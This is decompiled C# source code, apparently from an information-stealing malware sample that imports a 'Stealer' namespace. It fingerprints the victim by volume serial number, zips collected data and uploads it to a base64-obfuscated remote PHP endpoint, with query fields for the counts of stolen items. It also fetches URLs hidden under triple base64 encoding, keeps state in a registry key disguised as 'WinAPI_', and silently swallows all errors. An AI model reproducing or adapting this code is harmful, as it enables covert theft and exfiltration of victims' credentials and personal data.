using System;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using Stealer;

// Token: 0x02000019 RID: 25
internal class Class6
{
	// Token: 0x0600010C RID: 268 RVA: 0x00008E20 File Offset: 0x00007020
	public static string smethod_0()
	{
		string result;
		try
		{
			string str = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
			ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + str + ":\"");
			managementObject.Get();
			char[] array = managementObject["VolumeSerialNumber"].ToString().ToCharArray();
			Array.Reverse(array);
			result = Convert.ToBase64String(Encoding.UTF8.GetBytes(array.ToString())).Replace("=", "").ToUpper();
		}
		catch (Exception)
		{
			result = Convert.ToBase64String(Encoding.UTF8.GetBytes(Class6.smethod_2())).Replace("=", "").ToUpper();
		}
		return result;
	}

	// Token: 0x0600010D RID: 269 RVA: 0x00008EE0 File Offset: 0x000070E0
	public static bool smethod_1()
	{
		bool result;
		Class6.mutex_0 = new Mutex(true, Program.id, ref result);
		return result;
	}

	// Token: 0x0600010E RID: 270 RVA: 0x00008F00 File Offset: 0x00007100
	public static string smethod_2()
	{
		return Path.GetRandomFileName().Replace(".", "");
	}

	// Token: 0x0600010F RID: 271 RVA: 0x00008F24 File Offset: 0x00007124
	public static void smethod_3(string string_0, string string_1)
	{
		try
		{
			ZipFile.CreateFromDirectory(string_0, string_1, CompressionLevel.Optimal, false);
		}
		catch
		{
		}
	}

	// Token: 0x06000110 RID: 272 RVA: 0x00008F50 File Offset: 0x00007150
	public static void smethod_4(string string_0, string string_1, string string_2)
	{
		try
		{
			new WebClient().UploadFile(string.Concat(new string[]
			{
				Class6.smethod_5("aHR0cDovL2Z1Y2tpbmdhdi54eXo="),
				"/fifa/fifa.php?random=",
				Class6.smethod_2(),
				"&ci=",
				string_1,
				"&p=",
				Class10.string_0,
				"&c=",
				Class10.string_1,
				"&a=",
				Class10.string_2,
				"&f=",
				Class10.string_3,
				"&t=",
				Class10.string_4,
				"&fz=",
				Class10.string_5,
				"&s=",
				Class10.string_6,
				"&cr=",
				Class10.string_7,
				"&ds=",
				Class10.string_8,
				(Class10.string_10 != "") ? (" &dd=" + Class10.string_10.Replace(";", "\r\n")) : "&dd=",
				"&pd=",
				Class10.string_9
			}), "POST", string_0);
		}
		catch
		{
		}
	}

	// Token: 0x06000111 RID: 273 RVA: 0x000090B0 File Offset: 0x000072B0
	private static string smethod_5(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	// Token: 0x06000112 RID: 274 RVA: 0x000090D4 File Offset: 0x000072D4
	public static void smethod_6(string string_0)
	{
		try
		{
			WebClient webClient = new WebClient();
			webClient.OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(Convert.FromBase64String(string_0)))))));
		}
		catch
		{
		}
	}

	// Token: 0x06000113 RID: 275 RVA: 0x00009134 File Offset: 0x00007334
	public static void smethod_7(string string_0, string string_1)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("WinAPI_" + Program.id);
			registryKey.SetValue(string_0, string_1);
			registryKey.Close();
		}
		catch
		{
		}
	}

	// Token: 0x06000114 RID: 276 RVA: 0x00009180 File Offset: 0x00007380
	public static string smethod_8(string string_0)
	{
		string result = null;
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("WinAPI_" + Program.id);
			result = registryKey.GetValue(string_0).ToString();
			registryKey.Close();
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x06000115 RID: 277 RVA: 0x000091D4 File Offset: 0x000073D4
	public static void smethod_9(string string_0, string string_1, string string_2)
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_0);
			httpWebRequest.Headers.Add("Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
			httpWebRequest.UserAgent = string_1;
			httpWebRequest.Referer = "dfwegwerhrjjtyjht [" + string_2 + "]";
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.UTF8))
			{
				streamReader.ReadToEnd();
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000116 RID: 278 RVA: 0x0000276F File Offset: 0x0000096F
	public Class6()
	{
		Class34.A1SfXVPz7w9eh();
		base..ctor();
	}

	// Token: 0x04000041 RID: 65
	private static Mutex mutex_0;
}
